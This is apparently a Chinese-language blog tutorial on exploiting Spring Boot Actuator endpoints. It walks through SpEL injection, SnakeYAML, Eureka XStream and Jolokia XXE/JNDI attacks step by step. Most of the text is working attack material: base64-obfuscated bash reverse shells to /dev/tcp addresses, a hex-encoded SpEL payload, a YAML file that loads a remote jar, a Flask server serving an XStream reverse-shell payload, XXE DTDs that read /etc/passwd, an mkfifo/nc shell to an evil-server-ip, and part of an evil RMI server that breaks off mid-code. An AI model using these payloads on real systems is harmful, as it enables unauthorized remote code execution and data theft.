<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt; &amp; /dev/tcp/192.168.233.243/9090  0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">转换后:</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMy4yNDMvOTA5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>



<p>在将其转换为java字节</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210827151659784.png" class title="image-20210827151659784">



<p>使用nc监听192.168.233.243的9090端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9090</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>将转换后的java字节拼接到payload中，在浏览器中访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.233.243:9091/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]&#123;0x62,0x61,0x73,0x68,0x20,0x2d,0x63,0x20,0x7b,0x65,0x63,0x68,0x6f,0x2c,0x59,0x6d,0x46,0x7a,0x61,0x43,0x41,0x74,0x61,0x53,0x41,0x2b,0x4a,0x69,0x41,0x76,0x5a,0x47,0x56,0x32,0x4c,0x33,0x52,0x6a,0x63,0x43,0x38,0x78,0x4f,0x54,0x49,0x75,0x4d,0x54,0x59,0x34,0x4c,0x6a,0x49,0x7a,0x4d,0x79,0x34,0x79,0x4e,0x44,0x4d,0x76,0x4f,0x54,0x41,0x35,0x4d,0x43,0x41,0x77,0x50,0x69,0x59,0x78,0x7d,0x7c,0x7b,0x62,0x61,0x73,0x65,0x36,0x34,0x2c,0x2d,0x64,0x7d,0x7c,0x7b,0x62,0x61,0x73,0x68,0x2c,0x2d,0x69,0x7d&#125;))&#125;</span><br></pre></td></tr></table></figure>



<p>反弹shell成功</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210827152313055.png" class title="image-20210827152313055">





<h5 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h5><ol>
<li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li>
<li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li>
<li>其中  <code>$&#123;&#125;</code>  包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li>
</ol>
<p>详细分析参见下文:</p>
<p>​    <a href="https://www.cnblogs.com/litlife/p/10183137.html">SpringBoot SpEL表达式注入漏洞-分析与复现</a></p>
<h4 id="2-2Spring-clound-SnakeYAML-RCE"><a href="#2-2Spring-clound-SnakeYAML-RCE" class="headerlink" title="2.2Spring clound SnakeYAML RCE"></a>2.2Spring clound SnakeYAML RCE</h4><h5 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li>
<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
</ul>
<h5 id="利用方法-3"><a href="#利用方法-3" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一</strong>: <strong>托管yml和jar文件</strong></p>
<blockquote>
<p>首先在自己的机器上开启个python的http服务(或者使用apache和nginx)，然后将yml文件(访问jar包)和jar包放在根目录下，便于访问</p>
</blockquote>
<p>在根目录下放置yml文件，内容如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [<span class="string">&quot;http://your-ip-ip/example.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<p>在根目录下放置example.jar包(需要执行的命令)，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload">yaml-payload</a></p>
<p><strong>步骤二： 设置 spring.cloud.bootstrap.location 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip/example.yml</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三： 刷新配置</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="利用实例-1"><a href="#利用实例-1" class="headerlink" title="利用实例"></a><strong>利用实例</strong></h5><p>这里使用的是python开启http服务。当使用python开启http服务时，根目录为当前执行命令的目录，所以先把yml和jar包放置到根目录下在执行python命令开启http服务</p>
<p>在根目录下放置yml文件，内容如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [<span class="string">&quot;http://192.168.233.243/example.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<p>在根目录下放置example.jar包(需要执行的命令)，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload">yaml-payload</a></p>
<p>(代码也在网盘里面，为springcloud-snakeyaml-rce&#x2F;yaml-payload&#x2F;src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java)</p>
<p>只需将exec()里面修改为执行的命令即可</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210827163442633.png" class title="image-20210827163442633">



<p>将其进行打包成jar包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf example.jar -C src/ .</span><br></pre></td></tr></table></figure>



<p>使用python快速开启http服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>通过burp抓包并修改请求报文</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210829225702843.png" class title="image-20210829225702843">



<p>然后修改请求报文&#x2F;refresh，刷新配置文件</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210829230055895.png" class title="image-20210829230055895">

<p>反弹shell成功</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210829230223141.png" class title="image-20210829230223141">



<h5 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h5><ol>
<li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li>
<li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li>
<li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li>
<li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li>
<li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li>
<li>实例化类时执行恶意代码，造成 RCE 漏洞</li>
</ol>
<p>分析详情参见下文</p>
<p><a href="https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/">Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记</a></p>
<h4 id="2-3-Eureka服务漏洞"><a href="#2-3-Eureka服务漏洞" class="headerlink" title="2.3.Eureka服务漏洞"></a><strong>2.3.Eureka服务漏洞</strong></h4><p>Eureka服务漏洞需要存在两个包</p>
<blockquote>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-boot-starter-actuator（/refresh刷新配置需要）  </span><br><span class="line">spring-cloud-starter-netflix-eureka-client（功能依赖）</span><br></pre></td></tr></table></figure>
</blockquote>
<h5 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标使用的  <code>eureka-client</code> &lt; 1.8.7（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li>
<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
</ul>
<blockquote>
<p>  Eureka-Client&lt;1.8.7，eureka服务多用于netflix组件中，可通过在&lt;<br>  span&#x3D;””&gt;&#x2F;env中搜寻Netflix关键字判断时候可能存在Eureka服务</p>
</blockquote>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/7af2a3cf6a49f6b649e1aacbeb4aacf7.png" class>

<p>Eureka服务属性被设置为恶意的外部Eureka server<br>URL地址时，通过&#x2F;refresh会触发目标机器请求远程URL,Eureka server<br>URL可通过在&#x2F;env处POST数据进行更改</p>
<h5 id="利用方法-4"><a href="#利用方法-4" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一:  架设响应Xstream payload的网站</strong></p>
<p>提供一个依赖 Flask 并符合要求的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py">python 脚本示例</a>，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p>
<p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p>
<p><strong>步骤二：监听反弹 shell 的端口</strong></p>
<p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 监听端口</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤四：刷新配置</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="利用实例-2"><a href="#利用实例-2" class="headerlink" title="利用实例"></a>利用实例</h5><p>使用python 在服务器上搭建一个响应XStream payload的Web服务，代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python# coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span>)@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span>(<span class="params">path</span>):</span>    </span><br><span class="line">xml = <span class="string">&quot;&quot;&quot;&lt;linked-hash-set&gt;  &lt;jdk.nashorn.internal.objects.NativeString&gt;    </span></span><br><span class="line"><span class="string">&lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;      &lt;dataHandler&gt;        </span></span><br><span class="line"><span class="string">&lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;          </span></span><br><span class="line"><span class="string">&lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;            </span></span><br><span class="line"><span class="string">&lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;                    </span></span><br><span class="line"><span class="string">&lt;command&gt;                       </span></span><br><span class="line"><span class="string">&lt;string&gt;/bin/bash&lt;/string&gt;                       </span></span><br><span class="line"><span class="string">&lt;string&gt;-c&lt;/string&gt;                      </span></span><br><span class="line"><span class="string">&lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/192.168.233.247/1234 0&gt;&amp;amp;1&lt;/string&gt;                    </span></span><br><span class="line"><span class="string">&lt;/command&gt;                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;                  &lt;/next&gt;                </span></span><br><span class="line"><span class="string">&lt;/iter&gt;                </span></span><br><span class="line"><span class="string">&lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;                  &lt;method&gt;                    </span></span><br><span class="line"><span class="string">&lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;                    &lt;name&gt;start&lt;/name&gt;                    </span></span><br><span class="line"><span class="string">&lt;parameter-types/&gt;                 </span></span><br><span class="line"><span class="string"> &lt;/method&gt;                  </span></span><br><span class="line"><span class="string">&lt;name&gt;foo&lt;/name&gt;                </span></span><br><span class="line"><span class="string">&lt;/filter&gt;                </span></span><br><span class="line"><span class="string">&lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;             </span></span><br><span class="line"><span class="string"> &lt;/serviceIterator&gt;              </span></span><br><span class="line"><span class="string">&lt;lock/&gt;            </span></span><br><span class="line"><span class="string">&lt;/cipher&gt;            </span></span><br><span class="line"><span class="string">&lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;            &lt;ibuffer&gt;&lt;/ibuffer&gt;          </span></span><br><span class="line"><span class="string">&lt;/is&gt;        </span></span><br><span class="line"><span class="string">&lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">&lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">&lt;/value&gt;</span></span><br><span class="line"><span class="string">&lt;/jdk.nashorn.internal.objects.NativeString&gt;&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span>    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Python3启动web,如下:</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/7622e80d3286c478d7fdf42a216d67d4.png" class>



<p>使用Burp构造请求报文发送POST请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eureka.client.serviceUrl.defaultZone=http://192.168.233.249/xstream</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/85864c908118a436d542c5dfc3fedba5.png" class>

<p>刷新配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/e061acae7d5aaf5dd9e36a188a0c7375.png" class>



<p>kali开启监听端口1234获取反弹shell</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/c2aacb012495255a8681c062a427bc34.png" class>

<p>注：该漏洞的成功利用与jdk版本有关，此处用的是1.8.0_161</p>
<h5 id="利用原理-2"><a href="#利用原理-2" class="headerlink" title="利用原理"></a>利用原理</h5><ol>
<li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址</li>
<li>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload</li>
<li>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞</li>
</ol>
<p>详细分析参见下文</p>
<p><a href="https://www.freebuf.com/column/234719.html">Spring Boot Actuator从未授权访问到getshell</a></p>
<h4 id="2-4-Jolokia漏洞-XXE"><a href="#2-4-Jolokia漏洞-XXE" class="headerlink" title="2.4.Jolokia漏洞 XXE"></a><strong>2.4.Jolokia漏洞 XXE</strong></h4><h5 id="利用条件-6"><a href="#利用条件-6" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li><p>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</p>
</li>
<li><p>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</p>
</li>
<li><p>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p>
</li>
<li><p>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</p>
</li>
</ul>
<h5 id="利用方法-5"><a href="#利用方法-5" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一:查看已存在的 MBeans</strong></p>
<p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词。</p>
<p><strong>步骤二：托管 xml 文件</strong></p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"><span class="comment"># 也可以开启apache或者nginx的http服务将其放在根目录下</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code>  文件，内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;rmi://your-vps-ip:port/jndi&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>步骤三：准备要执行的 Java 代码</strong></p>
<p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code>JNDIObject.java</code>，</p>
<p>使用Maven对其进行编译打包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn clean install</span><br></pre></td></tr></table></figure>

<p><strong>然后将生成的</strong> jar包拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
<p><strong>步骤四：架设恶意 RMI 服务</strong></p>
<p>设置RMI服务的ip地址和开启服务端口8090</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>



<p><strong>步骤五：监听反弹 shell 的端口</strong></p>
<p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 监听端口</span><br></pre></td></tr></table></figure>



<p><strong>步骤六：从外部 URL 地址加载日志配置文件</strong></p>
<blockquote>
<p>⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p>
</blockquote>
<p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml</span><br></pre></td></tr></table></figure>



<h5 id="利用实例-3"><a href="#利用实例-3" class="headerlink" title="利用实例"></a>利用实例</h5><p>判断是否存在jolokia插件访问<a href="http://ip:port/jolokia/list">http://ip:port/jolokia/list</a> 是否存在</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/4406018ebff3c7de7dd29c07d7e0ccc7.png" class>



<p>在&#x2F;jolokia&#x2F;list 接口搜索关键字：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ch.qos.logback.classic.jmx.JMXConfigurator和reloadByURL</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/9fc925bb48d7fbc26191d101b9a9adab.png" class>



<p><strong>读取敏感文件</strong></p>
<p>创建xml文档logback.xml</p>
<p>请求访问fileread.dtd文件，192.168.233.1为服务器ip</p>
<blockquote>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?\&gt;</span><br><span class="line"></span><br><span class="line"> \&lt;!DOCTYPE a [ \&lt;!ENTITY % remote SYSTEM</span><br><span class="line"></span><br><span class="line">  &quot;http://192.168.233.1/filereaed.dtd&quot;\&gt;%remote;%int;]\&gt;</span><br><span class="line"></span><br><span class="line">\&lt;a\&gt;&amp;trick;\&lt;/a\&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>将该xml放到服务器上，用于访问获取</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/2c2311a2d34ee6ff782221a35d920431.png" class>

<p>创建文件fileread.dtd，读取&#x2F;etc&#x2F;passwd文件</p>
<blockquote>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % d SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  </span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &#x27;:%d;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/f2d4373437722b5f3d7ac97085b66953.png" class>



<p>在外部构造url访问，Payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.233.247:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/192.168.233.1!/logback.xml</span><br></pre></td></tr></table></figure>

<p>可以看到返回的信息中存在etc&#x2F;passwd的用户信息</p>
<p>如红框中所示</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/66e6d7ece8ce1dbfd308720f8cbbb751.png" class>



<p><strong>远程代码执行</strong></p>
<p>可以在logback.xml中使用insertFromJNDI标签，这个标签允许我们从 JNDI<br>加载变量，导致了rce漏洞产生。<br>rce的流程主要分为4步。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.  构造 Get 请求访问目标，使其去外部服务器加载恶意 logback.xml 文件。</span><br><span class="line"></span><br><span class="line">2.  解析 logback.xml 时，最终会触发 InitialContext.lookup(URI) 操作，而URI</span><br><span class="line">    为恶意 RMI 服务地址。</span><br><span class="line"></span><br><span class="line">3.  恶意 RMI 服务器向目标返回一个 Reference 对象，Reference</span><br><span class="line">    对象中指定了目标本地存在的 BeanFactory 类，以及Bean Class</span><br><span class="line">    的类名、属性、属性值（这里为 ELProcessor 、x、eval(...))。</span><br><span class="line"></span><br><span class="line">4.  目标在进行 lookup() 操作时，会动态加载并实例化 BeanFactory 类，接着调用</span><br><span class="line">    factory.getObjectInstance() 方法，通过反射的方式实例化 Reference</span><br><span class="line">    所指向的任意 Bean Class，并且会调用 setter</span><br><span class="line">    方法为所有的属性赋值。对应我们的代码，最终调用 setter</span><br><span class="line">    方法的时候，就是执行如下代码：</span><br><span class="line"></span><br><span class="line">ELProcessor.eval(\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc evil-server-ip port &gt;/tmp/f&#x27;]).start()\&quot;</span><br></pre></td></tr></table></figure>



<p>而 ELProcessor.eval() 会对 EL 表达式（这里为反弹 shell）进行求值，最终达到 RCE<br>的效果。</p>
<p>下面为编写的java代码漏洞利用poc，指定了反弹shell的ip地址和端口及其开启rmi服务的端口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Creating evil RMI registry on port 8090&quot;</span>);<span class="comment">//RMI服务地址为8090</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span 